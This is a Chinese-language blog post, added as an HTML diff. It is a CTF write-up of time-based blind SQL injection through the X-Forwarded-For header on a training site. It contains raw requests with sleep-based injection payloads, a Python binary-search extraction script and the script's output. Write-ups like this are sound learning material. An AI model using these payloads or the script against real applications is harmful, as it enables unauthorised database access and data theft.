@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha256-xejo6yLi6vGtAjcMIsY8BHdKsLg7QynVlFMzdQgUuy8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"m0nst3r.me","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.12.3","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="[TOC]##介绍  这是一道Time-based Blind时间盲注的题目。 SQLMAP自带的脚本无法完成注入。 注入点要header中的x-forwarded-for。  ##确定库数量 123456789101112131415161718192021GET &#x2F;web&#x2F;wonderkun&#x2F;index.php HTTP&#x2F;1.1Host: ctf5.shiyanbar.comUser-Agen">
+<meta property="og:type" content="article">
+<meta property="og:title" content="实验吧CTF WHO ARE YOU? Write-Up">
+<meta property="og:url" content="https://m0nst3r.me/web-sec/%E5%AE%9E%E9%AA%8C%E5%90%A7CTF%20WHO%20ARE%20YOU_%20Write-Up%20.html">
+<meta property="og:site_name" content="m0nst3r&#39;s blog">
+<meta property="og:description" content="[TOC]##介绍  这是一道Time-based Blind时间盲注的题目。 SQLMAP自带的脚本无法完成注入。 注入点要header中的x-forwarded-for。  ##确定库数量 123456789101112131415161718192021GET &#x2F;web&#x2F;wonderkun&#x2F;index.php HTTP&#x2F;1.1Host: ctf5.shiyanbar.comUser-Agen">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2017-10-18T03:12:00.000Z">
+<meta property="article:modified_time" content="2022-08-08T14:27:53.027Z">
+<meta property="article:author" content="m0nst3r">
+<meta property="article:tag" content="Web安全,渗透测试,网络安全,代码审计,逆向,编程">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://m0nst3r.me/web-sec/%E5%AE%9E%E9%AA%8C%E5%90%A7CTF%20WHO%20ARE%20YOU_%20Write-Up%20.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://m0nst3r.me/web-sec/%E5%AE%9E%E9%AA%8C%E5%90%A7CTF%20WHO%20ARE%20YOU_%20Write-Up%20.html","path":"web-sec/实验吧CTF WHO ARE YOU_ Write-Up .html","title":"实验吧CTF WHO ARE YOU? Write-Up"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>实验吧CTF WHO ARE YOU? Write-Up | m0nst3r's blog</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">m0nst3r's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Hello, Bugs</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">m0nst3r</p>
+  <div class="site-description" itemprop="description">Web安全、渗透测试、网络安全、代码审计、逆向、编程</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">65</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/web-sec/%E5%AE%9E%E9%AA%8C%E5%90%A7CTF%20WHO%20ARE%20YOU_%20Write-Up%20.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0nst3r">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m0nst3r's blog">
+      <meta itemprop="description" content="Web安全、渗透测试、网络安全、代码审计、逆向、编程">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="实验吧CTF WHO ARE YOU? Write-Up | m0nst3r's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          实验吧CTF WHO ARE YOU? Write-Up
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2017-10-18 11:12:00" itemprop="dateCreated datePublished" datetime="2017-10-18T11:12:00+08:00">2017-10-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-08 22:27:53" itemprop="dateModified" datetime="2022-08-08T22:27:53+08:00">2022-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/category/web-sec/" itemprop="url" rel="index"><span itemprop="name">web-sec</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>[TOC]<br>##介绍</p>
+<ol>
+<li>这是一道<code>Time-based Blind</code>时间盲注的题目。</li>
+<li>SQLMAP自带的脚本无法完成注入。</li>
+<li>注入点要<code>header</code>中的<code>x-forwarded-for</code>。</li>
+</ol>
+<p>##确定库数量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">GET /web/wonderkun/index.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: ctf5.shiyanbar.com</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">x-forwarded-for: 127.0.0.1&#x27; and (select case when (select count(*) from information_schema.schemata)=3 then sleep(5) else 1 end) and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Referer: http://www.shiyanbar.com/ctf/1941</span><br><span class="line"></span><br><span class="line">Cookie: Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1508208443; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*112186%2CnickName%3Am0nst3r; PHPSESSID=01ip3nh6419ngbse16vt662di7; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1508378062</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>当等于<code>3</code>的时候，响应为5秒，故数据库数量为3。<br>##确定库名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">GET /web/wonderkun/index.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: ctf5.shiyanbar.com</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">x-forwarded-for: 127.0.0.1&#x27; and (select case when (ascii(substr((select schema_name from information_schema.schemata limit 1 offset 0) from 1 for 1)))&gt;1 then sleep(5) else 1 end) and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Referer: http://www.shiyanbar.com/ctf/1941</span><br><span class="line"></span><br><span class="line">Cookie: Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1508208443; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*112186%2CnickName%3Am0nst3r; PHPSESSID=01ip3nh6419ngbse16vt662di7; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1508378062</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>##确定表名</p>
+<p>##确定列名</p>
+<p>##查询flag<br>看到过网上一篇文章写了一个脚本来跑，但是后来自己在实验过程中发现不对，原因是原作者的<code>判断</code>条件是用<code>字符</code>来判断的，然而：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> use mysql</span><br><span class="line">Reading <span class="keyword">table</span> information <span class="keyword">for</span> completion <span class="keyword">of</span> <span class="keyword">table</span> <span class="keyword">and</span> <span class="keyword">column</span> names</span><br><span class="line">You can turn off this feature <span class="keyword">to</span> <span class="keyword">get</span> a quicker startup <span class="keyword">with</span> <span class="operator">-</span>A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="string">&#x27;a&#x27;</span><span class="operator">=</span><span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">user</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> debian<span class="operator">-</span>sys<span class="operator">-</span>maint <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在MySQL看来，<code>a</code>和<code>A</code>是相等的，这就导致如果flag区分大小写的话，即使我们跑出来的是正确的字符，也不能成功。</p>
+<p>另外，那个脚本是用的<code>逐个字符判断</code>的方法，导致需要发很多数据包才行，不是很方便。</p>
+<p>##脚本<br>自己写了个更方便的脚本，利用的是<code>比较大小,确定范围</code>的方法，由于不是计算机专业，这个算法好像有个高大尚的名词，不过我忘记了，Orz，原理是每次判断先取范畴内中间的数，如果比这个数大，再取这个数和最在数之间的中间数，再判断，就好像折纸一样，每次取一半，这样的比较速度是很快的，发包也是很少。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctf_url = <span class="string">&#x27;http://ctf5.shiyanbar.com/web/wonderkun/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">TestRange</span>(<span class="params">i,rangeToTest</span>):</span><br><span class="line">	m = <span class="built_in">len</span>(rangeToTest)/<span class="number">2</span></span><br><span class="line">	checkRes = CheckAsc(i,rangeToTest[m])</span><br><span class="line">	<span class="keyword">return</span> checkRes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CheckAsc</span>(<span class="params">myPosition,theAscii</span>):</span><br><span class="line">	checkRes = <span class="number">0</span> <span class="comment">#1: bigger; -1: smaller</span></span><br><span class="line">	headers = &#123;<span class="string">&quot;x-forwarded-for&quot;</span>:<span class="string">&quot;127.0.0.1&#x27; &quot;</span>+<span class="string">&quot;and (select case when (ascii(substr((select flag from flag) from %d for 1)))&gt;%d then sleep(10) else 1 end) and &#x27;1&#x27;=&#x27;1&quot;</span> %(myPosition,theAscii)&#125;</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;[?]: Bigger than %d....&quot;</span> % theAscii</span><br><span class="line">		response = requests.get(ctf_url,headers=headers,timeout=<span class="number">8</span>)</span><br><span class="line">		checkRes = -<span class="number">1</span></span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;[-]: NO&quot;</span></span><br><span class="line">	<span class="keyword">except</span> requests.exceptions.ReadTimeout,e:</span><br><span class="line">		checkRes = <span class="number">1</span></span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;[+]: YES&quot;</span></span><br><span class="line">	<span class="keyword">return</span> checkRes</span><br><span class="line">							</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SetRange</span>(<span class="params">condition, r</span>):</span><br><span class="line">	m = <span class="built_in">len</span>(r)/<span class="number">2</span></span><br><span class="line">	<span class="keyword">if</span> condition == <span class="number">1</span>:</span><br><span class="line">		toTest = r[m:]</span><br><span class="line">	<span class="keyword">elif</span> condition == -<span class="number">1</span>:</span><br><span class="line">		toTest = r[:m+<span class="number">1</span>]</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;[i]: Adjusting the range to [%d-%d]&quot;</span> % (toTest[<span class="number">0</span>],toTest[-<span class="number">1</span>])</span><br><span class="line">	<span class="keyword">return</span> toTest</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CheckEqual</span>(<span class="params">myPosition, theAscii</span>):</span><br><span class="line">	isEqual = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	headers = &#123;<span class="string">&quot;x-forwarded-for&quot;</span>:<span class="string">&quot;127.0.0.1&#x27; &quot;</span>+<span class="string">&quot;and (select case when (ascii(substr((select flag from flag) from %d for 1)))=%d then sleep(6) else 1 end) and &#x27;1&#x27;=&#x27;1&quot;</span> %(myPosition,theAscii)&#125;</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		response = requests.get(ctf_url,headers=headers,timeout=<span class="number">4</span>)</span><br><span class="line">		isEqual = <span class="number">0</span></span><br><span class="line">	<span class="keyword">except</span> requests.exceptions.ReadTimeout,e:</span><br><span class="line">		isEqual = <span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> isEqual</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	x = <span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">		test = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>)]</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;[i]: Current Position %d&quot;</span> % x</span><br><span class="line">		f = <span class="number">0</span></span><br><span class="line">		<span class="keyword">while</span>(f == <span class="number">0</span>):</span><br><span class="line">			biggersmaller = TestRange(x,test)</span><br><span class="line">			test = SetRange(biggersmaller,test)</span><br><span class="line">			f = CheckEqual(x,test[<span class="built_in">len</span>(test)/<span class="number">2</span>])</span><br><span class="line">			<span class="keyword">if</span> f ==<span class="number">1</span>:</span><br><span class="line">				<span class="built_in">print</span> <span class="string">&quot;[*] Found ASCII: %d&quot;</span> % test[<span class="built_in">len</span>(test)/<span class="number">2</span>]</span><br><span class="line">				flag += <span class="built_in">chr</span>(test[<span class="built_in">len</span>(test)/<span class="number">2</span>])</span><br><span class="line">				<span class="built_in">print</span> flag</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;ctf&#123;%s&#125;&quot;</span> % flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行过程如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[i]: Current Position 8</span><br><span class="line">[?]: Bigger than 79....</span><br><span class="line">[-]: NO</span><br><span class="line">[i]: Adjusting the range to [32-79]</span><br><span class="line">[?]: Bigger than 56....</span><br><span class="line">[+]: YES</span><br><span class="line">[i]: Adjusting the range to [56-79]</span><br><span class="line">[?]: Bigger than 68....</span><br><span class="line">[-]: NO</span><br><span class="line">[i]: Adjusting the range to [56-68]</span><br><span class="line">[?]: Bigger than 62....</span><br><span class="line">[-]: NO</span><br><span class="line">[i]: Adjusting the range to [56-62]</span><br><span class="line">[?]: Bigger than 59....</span><br><span class="line">[-]: NO</span><br><span class="line">[i]: Adjusting the range to [56-59]</span><br><span class="line">[?]: Bigger than 58....</span><br><span class="line">[-]: NO</span><br><span class="line">[i]: Adjusting the range to [56-58]</span><br><span class="line">[*] Found ASCII: 57</span><br><span class="line">cdbf14c9</span><br><span class="line">ctf:cdbf14c9</span><br><span class="line">[i]: Current Position 9</span><br><span class="line">[?]: Bigger than 79....</span><br><span class="line">[-]: NO</span><br><span class="line">[i]: Adjusting the range to [32-79]</span><br><span class="line">[?]: Bigger than 56....</span><br><span class="line">[-]: NO</span><br><span class="line">[i]: Adjusting the range to [32-56]</span><br><span class="line">[?]: Bigger than 44....</span><br><span class="line">[+]: YES</span><br><span class="line">[i]: Adjusting the range to [44-56]</span><br><span class="line">[?]: Bigger than 50....</span><br><span class="line">[+]: YES</span><br><span class="line">[i]: Adjusting the range to [50-56]</span><br><span class="line">[*] Found ASCII: 53</span><br><span class="line">cdbf14c95</span><br><span class="line">ctf:cdbf14c95</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>基本上，6-8个包可以确定一位。</p>
+<p>##参考</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="http://blog.csdn.net/qq_35078631/article/details/54773769" title="Assassin的WriteUp">Assassin的WriteUp</a></li>
+<li>对于如何确定库名和表名，请自行参考这里：<a href="http://m0nst3r.me/sqli/114.html" title="MySQL中的Information_schema介绍">MySQL中的Information_schema介绍</a></li>
+</ol>
+<p>##写在最后<br>虽然我的脚本跑出来了，但是<code>结果是错的</code>。Orz…<br>求大神指点！</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/sqli/MySQL%E6%9D%A1%E4%BB%B6%E7%AD%89%E5%8F%B7%E7%9A%84%E5%BC%82%E5%B8%B8.html" rel="prev" title="MySQL条件等号的异常">
+                  <i class="fa fa-chevron-left"></i> MySQL条件等号的异常
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/sqli/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94update%E6%B3%A8%E5%85%A5.html" rel="next" title="SQL注入学习——update注入">
+                  SQL注入学习——update注入 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">m0nst3r</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
